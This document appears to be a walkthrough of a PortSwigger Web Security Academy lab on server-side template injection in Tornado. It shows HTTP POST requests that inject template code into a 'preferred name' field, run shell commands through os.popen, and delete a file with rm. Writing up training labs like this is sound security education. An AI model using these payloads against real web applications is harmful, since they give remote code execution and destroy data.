# Basic Server-Side Template Injection (Code Context)

This lab is exploitable through server-side template injection because of how a Tornado template is used unsafely. The goal is to consult the Tornado documentation, figure out how to execute arbitrary code, and then delete `morale.txt` from Carlos's home directory.

Login credentials for your own account: wiener:peter

Hint: Pay close attention to the "preferred name" feature.

---

**Reference:**
- https://portswigger.net/web-security/server-side-template-injection/exploiting

<img width="768" height="453" alt="1" src="https://github.com/user-attachments/assets/c4de3218-dd65-464a-b592-d4b39363364f" />


---

It's possible to update your email and set a preferred display name:

<img width="711" height="448" alt="2" src="https://github.com/user-attachments/assets/e60457d6-8dd5-445c-9a1b-7ea5f1431f69" />

<img width="1051" height="491" alt="3" src="https://github.com/user-attachments/assets/9791bb81-07bc-4d0b-a941-7d528f9461c9" />


Setting it to the nickname causes "H0td0g" to appear in the comments:

<img width="227" height="76" alt="4" src="https://github.com/user-attachments/assets/810fb258-eb7d-4396-a2c7-f75ef0a8f79f" />


```
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{{2*2}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```

<img width="772" height="484" alt="5" src="https://github.com/user-attachments/assets/094c1c13-f6c6-4515-be81-e301354ff094" />

<img width="249" height="75" alt="6" src="https://github.com/user-attachments/assets/b134bdb9-6402-4218-81b6-09fa78517337" />


```
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("whoami").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```

<img width="780" height="496" alt="7" src="https://github.com/user-attachments/assets/1a56030d-3369-49c8-a309-1eb38767e4d1" />

<img width="275" height="75" alt="8" src="https://github.com/user-attachments/assets/43e08bc8-eb46-4e87-81b7-64ec36e59d4d" />


``` 
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("rm+/home/carlos/morale.txt").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```

<img width="779" height="499" alt="9" src="https://github.com/user-attachments/assets/89c33004-703f-4c70-9ecf-6eb5756b606d" />

